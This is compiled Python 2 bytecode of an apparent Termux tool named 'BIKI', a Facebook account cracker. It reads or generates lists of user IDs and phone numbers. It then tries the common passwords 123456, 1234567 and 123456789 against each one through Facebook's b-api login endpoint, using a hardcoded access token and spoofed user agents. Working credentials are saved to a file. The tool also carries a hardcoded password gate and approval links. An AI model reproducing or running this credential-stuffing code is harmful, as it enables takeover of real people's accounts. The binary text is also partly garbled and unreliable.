ó
ç§ac           @   s«  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l Z d Z d   Z d   Z d Z d   Z d   Z e   y d  d l Z Wn8 e k
 r)e  j d  e j d  e  j d	  n Xd  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d
 l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j  e!  e j" e j# j$   d d d/ g e _% d0 g e _% d   Z& d   Z' d   Z( d   Z) d   Z d Z* g  a+ g  Z, g  a- d Z. d Z/ e  j d  Hd Z0 e0 GHd d GHd Z1 d Z2 d  Z3 x e3 d  k rce4 d!  Z5 e5 e1 k rNe4 d"  Z6 e6 e2 k r9d# GHe j d  d$ Z3 q`d% GHe  j d&  qâd' GHe  j d(  qâWd)   Z7 d*   Z8 d+   Z9 d,   Z: d-   Z; e< d. k r§e8   n  d S(1   iÿÿÿÿNs^  
[1;96m /$$$$$$$  /$$$$$$ /$$   /$$ /$$$$$$
| $$__  $$|_  $$_/| $$  /$$/|_  $$_/
| $$  \ $$  | $$  | $$ /$$/   | $$
| $$$$$$$   | $$  | $$$$$/    | $$
| $$__  $$  | $$  | $$  $$    | $$
| $$  \ $$  | $$  | $$\  $$   | $$
| $$$$$$$/ /$$$$$$| $$ \  $$ /$$$$$$
|_______/ |______/|__/  \__/|______/
[1;91m-----------------------------------------------c          C   sR   d d d d d d d g }  x0 |  D]( } d | Gt  j j   t j d  q" Wd  S(   Ns      s   .  s   .. s   ...s<   [1;91m [[1;92m*[1;91m][1;92m Wait A Few Moments [1;93mg      à?(   t   syst   stdoutt   flusht   timet   sleep(   t   titikt   o(    (    s   /storage/emulated/0/bi.pyt   tik	   s
    c          C   s   t  j d  t  j d  t GHd GHt d  }  t   x= t |   D]/ } t j d d  } t d d  t	 _
 | GHqD Wt	 j
 j   d  S(	   Ns   rm -rf .txtt   clears   [1;91m [[1;92m*[1;91m][1;92m Set Phone Number Amount You Want To Clone
[1;91m [[1;92m*[1;91m][1;92m Example:1000,2000,10000,20000
s-   [1;92m     Enter Amount[1;93mâ¢â¢ [1;96miGô i s   .txtt   a(   t   ost   systemt   logo2t   inputR   t   ranget   randomt   randintt   openR    R   R   (   t   walidt   nt   nmbr(    (    s   /storage/emulated/0/bi.pyt   jenw   s    	c          C   sÜ   t  j d  t GHd GHd GHd GHt j d  y t d d  j   }  Wn t t f k
 rg t	   n Xt
 j d  j } |  | k r t   nH t  j d  t GHd GHd	 GHd
 GHd |  GHt d  t  j d  t   d  S(   NR   t    s2   [1;31;1mAccess For This Tools Get Approval First i   s   /sdcard/DCIM/.niki.txtt   rsC   https://raw.githubusercontent.com/Kawsar-Cyber40/Kawsar/main/id.txts   	Approved Faileds!    [1;92m Your Id Is Not Approved s.    [1;92m Copy the id and send to Your ID Admins    [1;92m Your id : s   [1;92m Press enter to send idsH   am start https://wa.me/+919957975493?text=Please%20Give%20Me%Approve:%20(   R
   R   t   logo3R   R   R   t   readt   KeyErrort   IOErrort   reg2t   requestst   gett   textR   t	   raw_inputt   reg(   t   toR   (    (    s   /storage/emulated/0/bi.pyR!   "   s,    
	
c          C   s   t  j d  t GHd GHd GHt j   j d  }  d |  GHd GHt d  t  j d  t d	 d
  } | j |   | j	   t d  t
   d  S(   NR   s   	Approval not detecteds    [1;92mCopy and press enter ,i2   s
    Your id: R   s    Press enter to go to FacebooksH   am start https://wa.me/+919957975493?text=Please%20Give%20Me%Approve:%20s   /sdcard/DCIM/.niki.txtt   ws&   [1;92m Press enter to check Approval (   R
   R   R   t   uuidt   uuid4t   hexR    R   t   writet   closeR!   (   t   idt   sav(    (    s   /storage/emulated/0/bi.pyR   =   s    	


s   pip2 install requesti   s   Then type: python2 clone.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c           C   s   d GHt  j j   d  S(   Ns   Thanks.(   R
   R    t   exit(    (    (    s   /storage/emulated/0/bi.pyt   keluarb   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjcR   t   !i    i   (   t   xR   R   t   lent   cetak(   t   bR#   t   dt   i(    (    s   /storage/emulated/0/bi.pyt   acakg   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR2   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR    R   R'   (   R7   R#   R9   t   jR4   (    (    s   /storage/emulated/0/bi.pyR6   p   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R    R   R'   R   R   R   (   t   zt   e(    (    s   /storage/emulated/0/bi.pyt   jalan{   s    c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [1;93mstart cloning [1;91mi   (   R    R   R   R   R   (   R   R   (    (    s   /storage/emulated/0/bi.pyR      s
    i    s   [31mNot Vulns	   [32mVulnR   i/   s   [1;91m-t   NIKIt   BIKIt   trues,   [1;92m [1;92mTool Username [1;92m:[1;92ms,   [1;92m [1;92mTool Password [1;92m:[1;92ms    Logged in successfully as a Paidt   falses   [1;92mWrong Passwords=   xdg-open https://youtube.com/channel/UCZL_Wjboqc4BOSSdHz7SjIQs   [1;92mWrong Usernames>   xdg-open  https://youtube.com/channel/UCZL_Wjboqc4BOSSdHz7SjIQc           C   s   t  j d  t   d  S(   NR   (   R
   R   t   login(    (    (    s   /storage/emulated/0/bi.pyt   lisensi¨   s    c           C   s=   t  j d  t GHd d GHd GHt j d  d GHt   d  S(   NR   i/   s   [1;91m-s.   [1;91m[[1;92m1[1;91m][1;92m START CRACKINGg©?s+   [1;91m[[1;92m0[1;91m][1;92m BACK[1;92m(   R
   R   t   logo1R   R   t   pilih_login(    (    (    s   /storage/emulated/0/bi.pyRF   ­   s    	c          C   sA   t  d  }  |  d k r' d GHt   n |  d k r= t   n  d  S(   Ns0   
[1;91m[[1;92m*[1;91m][1;92m CHOOSE: [1;92mR   s   [1;92mFill In Correctlyt   1(   R    RI   t   Zeek(   t   peak(    (    s   /storage/emulated/0/bi.pyRI   ·   s    
c           C   sJ   t  j d  t GHd d GHd GHt j d  d GHt j d  t   d  S(   NR   i/   s   [1;91m-sN   [1;91m[[1;92m1[1;91m][1;92m START CRACK OLD ID [1;91m[[1;92m2009[1;91m]g©?s$   [1;91m[[1;92m0[1;91m][1;92m BACK(   R
   R   RH   R   R   t   action(    (    (    s   /storage/emulated/0/bi.pyRK   À   s    	c             sØ  t  d  }  |  d k r' d GHt   nÙ |  d k rÞ t j d  t GHd d GHd GHd	 GHd
 GHd GHyO t  d    d  d } x0 t | d  j   D] } t j | j	    q WWq t
 k
 rÚ d GHt  d  t   q Xn" |  d k rô t   n d GHt   d d GHt t t   } t d |  t d    t d  t d  d d GH   f d   } t d  } | j | t  d d GHd GHd t t t   d t t t   GHd GHd GHt  d  t   d  S(    Ns/   
[1;91m[[1;92m*[1;91m][1;92m CHOOSE:[1;92mR   s   [!] Fill In CorrectlyRJ   R   i/   s   [1;91m-s<   [1;91m [[1;92m*[1;91m][1;92m FACEBOOK UID ACCOUNT CLONERs6   [1;91m [[1;92m*[1;91m][1;96m TYPE 2 DIGIT UID CODEsA   [1;91m [[1;92m*[1;91m][1;92m 00,01,02,03,04,05,06,07,08,09,10sA   [1;91m [[1;92m*[1;91m][1;93m 11,12,13,14,15,16,17,18,19,20,30s+   
[1;91m [[1;92m*[1;91m][1;92m CHOOSE : t   100000s   .txtR   s   [!] File Not Founds	   
[ Back ]t   0s4   [1;91m [[1;92m*[1;91m][1;92m TOTAL UID NUMBER : s4   [1;91m [[1;92m*[1;91m][1;92m UID YOU CHOOSE   : s>   [1;91m [[1;92m*[1;91m][1;92m START UID ACCOUNT CRACKING...s9   [1;91m [[1;92m*[1;91m][1;92m STOP THIS PROSSES CTRL+Zi0   c   	         s¯  |  } y t  j d  Wn t k
 r* n Xyvd } t j d    | d | d  } t j |  } d | k rÝ d    | d | GHt d	 d
  } | j    | | d  | j   t	 j
   | |  nÃd | d k rTd    | d | GHt d	 d
  } | j    | | d  | j   t j
   | |  nLd } t j d    | d | d  } t j |  } d | k rd    | d | GHt d	 d
  } | j    | | d  | j   t	 j
   | |  nd | d k rzd    | d | GHt d	 d
  } | j    | | d  | j   t j
   | |  n&d } t j d    | d | d  } t j |  } d | k r)d    | d | GHt d	 d
  } | j    | | d  | j   t	 j
   | |  nw d | d k r d    | d | GHt d	 d
  } | j    | | d  | j   t j
   | |  n  Wn n Xd  S(   Nt   savet   123456s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens    [1;92m [[1;92mBIKI-OK[1;92m] s     |  s   save/niki.txtR	   s   
s   www.facebook.comt	   error_msgs    [1;93m [[1;93mBIKI-CP[1;93m] t   1234567s!   [1;92m [[1;92mBIKI-OK[1;92m]  t	   123456789(   R
   t   mkdirt   OSErrort   brR   t   jsont   loadR'   R(   t   okst   appendt   cpb(	   t   argt   usert   pass1t   datat   qt   okbt   cpst   pass2t   pass3(   t   ct   k(    s   /storage/emulated/0/bi.pyt   mainó   sj    '

'

'

i   s    Process Has Been Completeds   Total OK/CP : t   /s/    Cloned Accounts Has Been Saved : save/biki.txts7   
    
    
    
    

[1;92mThanks For Using BIKI_Tools   
[1;92m[[1;92mBack[1;92m](   R    RM   R
   R   RH   R   t	   readlinesR)   R\   t   stripR   t   blackmafiaxRF   R=   R5   RA   R+   t   mapR[   R]   (   RL   t   idlistt   linet   xxxRi   t   p(    (   Rg   Rh   s   /storage/emulated/0/bi.pyRM   Ë   sV    
	

	

	:	)
t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](=   R
   R    R   t   datetimeR   t   hashlibt   ret	   threadingRY   t   urllibt	   cookielibt   getpassR$   R   R   R   R   R   R!   R   t	   mechanizet   ImportErrorR   R   t   multiprocessing.poolR+   t   requests.exceptionsR,   R-   t   reloadt   setdefaultencodingRX   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR1   R:   R6   RA   t   backR[   R)   R]   t   vulnott   vulnRH   t   CorrectUsernamet   CorrectPasswordt   loopR    t   usernamet   passwordRG   RF   RI   RK   RM   t   __name__(    (    (    s   /storage/emulated/0/bi.pyt   <module>   s|   ¨				
											
				m


	